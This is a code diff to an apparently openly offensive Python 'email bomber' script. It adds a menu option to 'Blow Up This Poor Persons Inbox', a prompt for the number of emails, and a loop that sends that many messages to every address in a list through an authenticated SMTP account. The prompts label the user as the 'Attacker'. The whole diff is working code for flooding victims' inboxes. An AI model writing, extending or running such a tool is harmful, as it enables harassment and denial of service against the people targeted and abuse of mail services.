@@ -29,6 +29,25 @@ def multiple_emails():
         with open(email_list,'r') as f:
             email_list = [line.strip() for line in f]
 
+        print("\n [1] Send One Email ")
+        print('\n [2] Blow Up This Poor Persons Inbox ')
+        print('\n [3] Main Menu ')
+        answer = input('\n -> ')
+        if answer == '1':
+            number = 1
+        elif answer == '2':
+            print('[bold red] [WARNING][/bold red] This could take a long time\n and/or may not be able to send all the emails! ')
+            warning = input('\n [return] -> ')
+            number = input('\n Number of Emails: ')
+        elif answer == '3':
+            if platform.system() == 'Windows':
+                os.system('py main.py')
+            else:
+                os.system('Python3 main.py')
+        else:
+            print('[bold red] [!] Unrecognized Input ')
+            sys.exit()
+
         message = MIMEMultipart()
         sender_email = input('\n Attacker Email: ')
         password = getpass('\n Attacker Password: ')
@@ -36,7 +55,8 @@ def multiple_emails():
         body = input('\n Message: ')
         message.attach(MIMEText(body, 'plain'))
 
-        server = input('\n Are you using gmail [y/n]? ')
+        print('\n Are you using gmail [y/n]? ')
+        server = input('\n ->')
         if server == 'y':
             port = 587
             smtp = 'smtp.gmail.com'
@@ -66,24 +86,28 @@ def multiple_emails():
                 server.starttls()
                 server.login(sender_email, password)
                 for receiver_email in track(email_list, description='[bold red] Sending Emails...'):
-                    message['From'] = sender_email
-                    message['To'] = receiver_email
-                    message['Subject'] = subject
-                    text = message.as_string()
-                    server.sendmail(sender_email, receiver_email, text)
-                    sleep(1)
-                    sys.stdout.flush()
+                    for i in range(1, int(number) + 1):
+                        message['From'] = sender_email
+                        message['To'] = receiver_email
+                        message['Subject'] = subject
+                        text = message.as_string()
+                        server.sendmail(sender_email, receiver_email, text)
+                        sleep(1)
+                        sys.stdout.flush()
                 server.quit()
             print('[bold cyan]\n Bomb Completed!')
             print('[bold cyan] E-mails sent: %i' % len(email_list))
             sys.exit()
 
         except KeyboardInterrupt:
-            print('[bold red]\n [!] Bombing Interrupted ')
+            print('\n[bold red] [!] Bombing Interrupted ')
             sys.exit()
 
+        except Exception as e:
+            print("\n[bold red] [!] Something went wrong.. Printing the error: {0}".format(e))
+
     elif list == 'n':
-        print('\n Add the emails you want to the list! ')
+        print('\n[bold cyan] Add the emails you want to the list! ')
         sys.exit()
     else:
         print('[bold red] [!] Unrecognized Input ')
